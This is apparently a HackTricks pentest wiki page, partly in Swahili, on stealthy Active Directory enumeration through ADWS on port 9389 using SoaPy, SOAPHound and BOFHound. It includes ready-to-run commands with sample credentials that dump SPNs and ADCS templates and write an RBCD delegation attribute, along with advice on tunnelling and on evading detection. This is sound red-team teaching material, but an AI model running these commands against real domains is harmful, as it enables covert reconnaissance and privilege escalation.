# Utambuzi wa Active Directory Web Services (ADWS) na Ukusanyaji wa Kificho

{{#include ../../banners/hacktricks-training.md}}

## ADWS ni nini?

Active Directory Web Services (ADWS) is **enabled by default on every Domain Controller since Windows Server 2008 R2** and listens on TCP **9389**.  Despite the name, **no HTTP is involved**.  Instead, the service exposes LDAP-style data through a stack of proprietary .NET framing protocols:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Kwa sababu trafiki imefungwa ndani ya fremu hizi za binary SOAP na inasafiri kupitia bandari isiyo ya kawaida, **utambuzi kupitia ADWS uwezekano mdogo wa kuchunguzwa, kuchujwa au kugunduliwa kwa kutumia saini ikilinganishwa na trafiki ya kawaida ya LDAP/389 & 636**. Kwa wafanyakazi wa uendeshaji, hii ina maana:

* Utambuzi wa kwa siri zaidi – Blue teams mara nyingi zinalenga maswali ya LDAP.
* Uhuru wa kukusanya kutoka kwa **vifaa visivyo vya Windows (Linux, macOS)** kwa kupitia tuneli ya 9389/TCP kupitia proxy ya SOCKS.
* Data ile ile utakayopata kupitia LDAP (watumiaji, vikundi, ACLs, schema, n.k.) na uwezo wa kufanya **kuandika** (mfano `msDs-AllowedToActOnBehalfOfOtherIdentity` kwa **RBCD**).

Mihusiano ya ADWS inaendeshwa juu ya WS-Enumeration: kila query huanza na ujumbe wa `Enumerate` unaobainisha kichujio/attributes za LDAP na hurudisha `EnumerationContext` GUID, ikifuatiwa na ujumbe mmoja au zaidi wa `Pull` ambao hutoa mtiririko hadi dirisha la matokeo lililowekwa na server. Contexts huisha baada ya ~30 dakika, kwa hiyo zana zinahitaji kurudisha matokeo kwa ukurasa au kugawanya filters (maswali ya prefix kwa kila CN) ili kuepuka kupoteza state. Unapoomba security descriptors, bainisha udhibiti `LDAP_SERVER_SD_FLAGS_OID` ili kuondoa SACLs, vinginevyo ADWS itatoa tu sifa `nTSecurityDescriptor` kutoka kwenye jibu lake la SOAP.

> KUMBUKU: ADWS pia inatumiwa na zana nyingi za RSAT GUI/PowerShell, hivyo trafiki inaweza kuchanganyika na shughuli halali za admin.

## SoaPy – Mteja Asilia wa Python

[SoaPy](https://github.com/logangoins/soapy) ni **full re-implementation of the ADWS protocol stack in pure Python**.  It crafts the NBFX/NBFSE/NNS/NMF frames byte-for-byte, allowing collection from Unix-like systems without touching the .NET runtime.

### Vipengele Muhimu

* Inasaidia **proxying through SOCKS** (inayofaa kwa implants za C2).
* Vichujio vya utafutaji vya kina vinavyolingana na LDAP `-q '(objectClass=user)'`.
* Uwezo wa hiari wa operesheni za **kuandika** ( `--set` / `--delete` ).
* **BOFHound output mode** kwa uingizaji moja kwa moja ndani ya BloodHound.
* `--parse` flag kuboresha muonekano wa timestamps / `userAccountControl` wakati inahitajika kusomeka na binadamu.

### Bendera za ukusanyaji zinazolenga & operesheni za kuandika

SoaPy inakuja na switches zilizochaguliwa zinazorudia kazi za kawaida za uwindaji za LDAP juu ya ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, pamoja na raw `--query` / `--filter` kwa pulls maalum. Waambatanishe na primitives za kuandika kama `--rbcd <source>` (huweka `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging kwa Kerberoasting iliyolengwa) na `--asrep` (kubadilisha `DONT_REQ_PREAUTH` katika `userAccountControl`).

Mfano wa utafutaji wa SPN uliolengwa unaorejesha tu `samAccountName` na `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Tumia mwenyeji na sifa za kuingia ile ile ili mara moja kugeuza matokeo kuwa silaha: dump RBCD-capable objects kwa kutumia `--rbcds`, kisha tumia `--rbcd 'WEBSRV01$' --account 'FILE01$'` ili kuandaa mnyororo wa Resource-Based Constrained Delegation (angalia [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) kwa njia kamili ya matumizi mabaya).

### Ufungaji (mwenyeji wa operator)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – Ukusanyaji wa ADWS wa Kiasi Kikubwa (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ni mkusanyaji wa .NET unaoweka mwingiliano wote wa LDAP ndani ya ADWS na hutengeneza JSON inayolingana na BloodHound v4. Inajenga cache kamili ya `objectSid`, `objectGUID`, `distinguishedName` na `objectClass` mara moja (`--buildcache`), kisha inaitumia tena kwa kipindi cha `--bhdump`, `--certdump` (ADCS), au `--dnsdump` (AD-integrated DNS) cha kiasi kikubwa ili takriban sifa muhimu ~35 tu zisitoke kutoka DC. AutoSplit (`--autosplit --threshold <N>`) huigawanya maswali kwa prefiksi ya CN kiotomatiki ili kubaki chini ya muda wa mwisho wa dakika 30 wa EnumerationContext katika misitu mikubwa.

Mtiririko wa kawaida wa kazi kwenye operator VM iliyounganishwa na domain:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
JSON zilizotolewa zinaingizwa moja kwa moja kwenye SharpHound/BloodHound workflows—angalia [BloodHound methodology](bloodhound.md) kwa mawazo ya kuchora grafu kwa hatua zinazofuata. AutoSplit inafanya SOAPHound kuwa imara kwenye misitu yenye mamilioni ya object huku ikidumisha idadi ya queries kuwa chini kuliko snapshots za mtindo wa ADExplorer.

## Stealth AD Collection Workflow

Mchakato ufuatao unaonyesha jinsi ya kuorodhesha **domain & ADCS objects** kupitia ADWS, kuzibadilisha kuwa BloodHound JSON na kuzipigania njia za mashambulizi zinazotegemea vyeti – yote kutoka Linux:

1. **Tunnel 9389/TCP** kutoka kwenye mtandao wa lengo hadi kwenye mashine yako (kwa mfano via Chisel, Meterpreter, SSH dynamic port-forward, n.k.). Weka `export HTTPS_PROXY=socks5://127.0.0.1:1080` au tumia SoaPy’s `--proxyHost/--proxyPort`.

2. **Kusanya root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Kusanya vitu vinavyohusiana na ADCS kutoka Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Geuza kuwa BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Pakia ZIP** katika BloodHound GUI na endesha cypher queries kama `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ili kufichua certificate escalation paths (ESC1, ESC8, etc.).

### Kuandika `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Changanya hili na `s4u2proxy`/`Rubeus /getticket` kwa mnyororo kamili wa **Resource-Based Constrained Delegation** (angalia [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Muhtasari wa Zana

| Madhumuni | Zana | Maelezo |
|---------|------|-------|
| Uorodheshaji wa ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, kusoma/kuandika |
| Upakuaji wa ADWS kwa wingi | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, hali za BH/ADCS/DNS |
| Uingizaji kwa BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Hubadilisha logu za SoaPy/ldapsearch |
| Komproma ya vyeti | [Certipy](https://github.com/ly4k/Certipy) | Inaweza kupitishwa kupitia SOCKS hiyo hiyo |

## Marejeo

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
